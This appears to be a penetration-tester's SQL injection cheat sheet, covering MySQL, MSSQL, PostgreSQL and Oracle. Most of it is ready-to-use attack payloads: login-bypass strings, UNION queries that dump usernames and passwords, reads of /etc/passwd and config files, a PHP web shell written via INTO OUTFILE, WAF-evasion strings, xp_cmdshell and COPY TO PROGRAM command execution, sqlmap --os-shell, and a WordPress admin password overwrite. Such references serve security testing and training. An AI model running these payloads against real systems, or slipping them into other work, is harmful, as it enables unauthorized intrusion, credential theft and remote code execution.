# SQL Injection

---

## How SQL Injection Works

When user input is inserted directly into SQL queries without sanitization, attackers can break out of the intended query and execute arbitrary SQL.

### Vulnerable PHP Code Example

```php
$username = $_POST['username'];
$query = "SELECT * FROM logins WHERE username='$username'";
```

If user inputs: `admin'-- -`

Query becomes:

```sql
SELECT * FROM logins WHERE username='admin'-- -'
```

The `-- -` comments out the rest, bypassing any password check.

---

## SQLi Discovery

### Escape Context Characters

Try these to break out of the current query context:

```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

### Test Payloads

| Payload | URL Encoded |
|---------|-------------|
| `'` | `%27` |
| `"` | `%22` |
| `` ` `` | `%60` |
| `#` | `%23` |
| `;` | `%3B` |
| `)` | `%29` |
| `')` | `%27%29` |
| `"))` | `%22%29%29` |

If you get a SQL error or different behavior, injection may be possible.

---

## SQL Comments (End Query Early)

| DBMS | Comment Syntax |
|------|----------------|
| MySQL | `#`, `-- -` (space required), `/*comment*/` |
| PostgreSQL | `--`, `/*comment*/` |
| MSSQL | `--`, `/*comment*/` |
| Oracle | `--` |
| SQLite | `--`, `/*comment*/` |

**Note:** `-- ` requires a space after. Use `-- -` or URL encode as `--+`

---

## Types of SQL Injection

| Type | Description |
|------|-------------|
| **Union-based** | Results visible on page, use UNION to extract data |
| **Error-based** | Database errors reveal query output |
| **Boolean Blind** | True/false responses based on conditions |
| **Time Blind** | Use SLEEP() to infer data based on response time |
| **Out-of-band** | Exfiltrate data via DNS or HTTP requests |

---

## Authentication Bypass

### Common Payloads

```sql
admin'-- -
admin'#
' OR '1'='1'-- -
' OR '1'='1'#
' OR 1=1-- -
admin' OR '1'='1
') OR ('1'='1
admin')-- -
```

### How `OR` Injection Works

Original query:

```sql
SELECT * FROM logins WHERE username='$user' AND password='$pass';
```

With input `admin' OR '1'='1'-- -`:

```sql
SELECT * FROM logins WHERE username='admin' OR '1'='1'-- -' AND password='anything';
```

Since `'1'='1'` is always true, authentication is bypassed.

---

## UNION Injection

UNION combines results from multiple SELECT statements. Both queries must return the same number of columns.

### Step 1: Detect Number of Columns

#### Method A: ORDER BY

```sql
' ORDER BY 1-- -     # works
' ORDER BY 2-- -     # works
' ORDER BY 3-- -     # works
' ORDER BY 4-- -     # ERROR - table has 3 columns
```

#### Method B: UNION SELECT

```sql
' UNION SELECT NULL-- -           # error
' UNION SELECT NULL,NULL-- -      # error
' UNION SELECT NULL,NULL,NULL-- - # success - 3 columns
```

### Step 2: Find Visible Columns

```sql
' UNION SELECT 1,2,3-- -
```

If page displays `2` and `3`, those columns are visible for data extraction.

### Step 3: Extract Data

```sql
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,user(),3-- -
' UNION SELECT 1,database(),3-- -
```

---

## Database Enumeration

### MySQL Fingerprinting

| Payload | Expected Output |
|---------|-----------------|
| `SELECT @@version` | MySQL/MariaDB version string |
| `SELECT POW(1,1)` | `1` (numeric test) |
| `SELECT SLEEP(5)` | 5 second delay |

### Enumerate Databases

```sql
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -
```

### Current Database

```sql
' UNION SELECT 1,database(),3-- -
```

### Enumerate Tables

```sql
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='database_name'-- -
```

### Enumerate Columns

```sql
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
```

### Dump Data

```sql
' UNION SELECT 1,username,password FROM users-- -

-- Concat multiple columns
' UNION SELECT 1,CONCAT(username,':',password),3 FROM users-- -
' UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users-- -
```

---

## MySQL Useful Functions & Variables

```sql
-- Functions
@@version                    -- MySQL version
user()                       -- Current user
database()                   -- Current database
schema()                     -- Current schema
system_user()                -- System user
session_user()               -- Session user
current_user()               -- Current user
UUID()                       -- UUID

-- Variables
@@hostname                   -- Server hostname
@@datadir                    -- Data directory path
@@basedir                    -- MySQL install path
@@tmpdir                     -- Temp directory
@@log                        -- Log path
@@log_error                  -- Error log path
@@version_comment            -- Version comment
@@version_compile_os         -- Compile OS
@@version_compile_machine    -- Compile machine
@@GLOBAL.have_symlink        -- Symlink support
@@GLOBAL.have_ssl            -- SSL support
```

---

## File Read (MySQL)

### Check FILE Privilege

```sql
' UNION SELECT 1,super_priv,3 FROM mysql.user WHERE user='root'-- -
' UNION SELECT 1,grantee,privilege_type FROM information_schema.user_privileges-- -
```

### Read Files with LOAD_FILE()

```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- -
```

---

## File Write (MySQL)

### Check secure_file_priv

```sql
' UNION SELECT 1,variable_name,variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
```

- Empty = can write anywhere
- `/path/` = can only write to that directory  
- NULL = cannot write files

### Write Files with INTO OUTFILE

```sql
' UNION SELECT 1,'test',3 INTO OUTFILE '/var/www/html/test.txt'-- -
```

### Write Web Shell

```sql
' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" INTO OUTFILE '/var/www/html/shell.php'-- -
```

Then access: `http://target/shell.php?0=id`

---

## Web Root Paths

| Server | Common Paths |
|--------|--------------|
| Apache (Linux) | `/var/www/html/`, `/var/www/`, `/srv/http/` |
| Nginx (Linux) | `/var/www/html/`, `/usr/share/nginx/html/` |
| IIS (Windows) | `C:\inetpub\wwwroot\` |
| XAMPP | `/xampp/htdocs/`, `C:\xampp\htdocs\` |

---

## Blind SQL Injection

### Boolean-Based

```sql
-- If page loads normally when true, different when false
' AND 1=1-- -    # true
' AND 1=2-- -    # false

-- Extract data character by character
' AND SUBSTRING(database(),1,1)='a'-- -
' AND SUBSTRING(database(),1,1)='b'-- -
' AND ASCII(SUBSTRING(database(),1,1))>97-- -
```

### Time-Based

```sql
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
```

---

## Second-Order SQL Injection

Payload stored in database, executed later in different query.

Example: Register with username `admin'-- -`, later displayed/used in vulnerable query.

---

## WAF Bypass Techniques

### Case Manipulation

```sql
UniOn SeLeCt
uNiOn SeLeCt
```

### Comment Injection

```sql
UN/**/ION/**/SEL/**/ECT
/*!UNION*//*!SELECT*/
```

### URL Encoding

```
UNION  →  %55%4e%49%4f%4e
SELECT →  %53%45%4c%45%43%54
```

### Double URL Encoding

```
' → %27 → %2527
```

### Whitespace Alternatives

```sql
/**/     -- comment as space
%09      -- tab
%0a      -- newline
%0d      -- carriage return
```

### Operator Alternatives

```sql
AND   →  &&  →  %26%26
OR    →  ||  →  %7C%7C
=     →  LIKE, REGEXP, RLIKE, not < and not >
> X   →  not between 0 and X
WHERE →  HAVING
```

### UNION SELECT Bypass Strings

```
union select
!UNiOn*/ /*!SeLEct*/
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*/ /*!se%6cect*/
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
/*--*/union/*--*/select/*--*/
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
/**/uNIon/**/sEleCt/**/
+union+distinct+select+
+union+distinctROW+select+
+UnIOn%0D%0ASeleCt%0D%0A
```

### Hex Spacing for Gaps

```
0x1a  -- no space
0x2a  -- *
0x3a  -- :
0x4a  -- J
0x5a  -- Z
0x10a -- SPACE
```

---

## MSSQL Specific

### Version

```sql
SELECT @@version
```

### Current User

```sql
SELECT user_name()
SELECT system_user
```

### Databases

```sql
SELECT name FROM master..sysdatabases
```

### Tables

```sql
SELECT name FROM sysobjects WHERE xtype='U'
```

### Enable xp_cmdshell (RCE)

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### MSSQL Blind Exploitation

```sql
-- Numeric context differences
AND 1=1
AND 1=2

-- Leak data character by character
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109

-- Time-based
AND IF(substring(user(),1,1)='a',SLEEP(5),1)--"

-- Check if admin table exists
AND IF(SUBSTRING((select 1 from admin limit 0,1),1,1)=1,SLEEP(5),1)
```

---

## PostgreSQL Specific

### Version

```sql
SELECT version()
```

### Current User

```sql
SELECT current_user
```

### Databases

```sql
SELECT datname FROM pg_database
```

### Tables

```sql
SELECT tablename FROM pg_tables WHERE schemaname='public'
```

### File Read

```sql
SELECT pg_read_file('/etc/passwd')
```

### Command Execution

```sql
COPY (SELECT '') TO PROGRAM 'id';
```

---

## Oracle Specific

### Version

```sql
SELECT banner FROM v$version
```

### Current User

```sql
SELECT user FROM dual
```

### Tables

```sql
SELECT table_name FROM all_tables
```

### Columns

```sql
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

---

## Remote MySQL Connection

```bash
mysql -h $ip -u root -p
mysql -h $ip -u root -p'password'
mysql -h $ip -P 3306 -u root -p
```

### After Connection

```sql
SHOW DATABASES;
USE database_name;
SHOW TABLES;
DESCRIBE table_name;
SELECT * FROM users;
```

### Change WordPress Password

```sql
SELECT ID, user_login, user_pass FROM wp_users WHERE user_login='admin';
UPDATE wp_users SET user_pass='c424ada17bf6e27794273b7db21cf950' WHERE user_login='admin';
-- Password is now 'rowbot' (MD5)
```

---

## Output Format Fix

When SQL output is messy in terminal:

```sql
SELECT * FROM users;      -- table format
SELECT * FROM users\G     -- vertical format (cleaner)
```

---

## SQLMap

**See dedicated page:** [SQLMap Guide](../tool-guides/sqlmap.md)

Quick commands:

```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1" --batch

# From Burp request
sqlmap -r request.txt --batch

# Enumerate & dump
sqlmap -u "URL" --dbs
sqlmap -u "URL" -D dbname --tables
sqlmap -u "URL" -D dbname -T users --dump

# OS shell
sqlmap -u "URL" --os-shell --technique=E
```

---

## Resources

- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
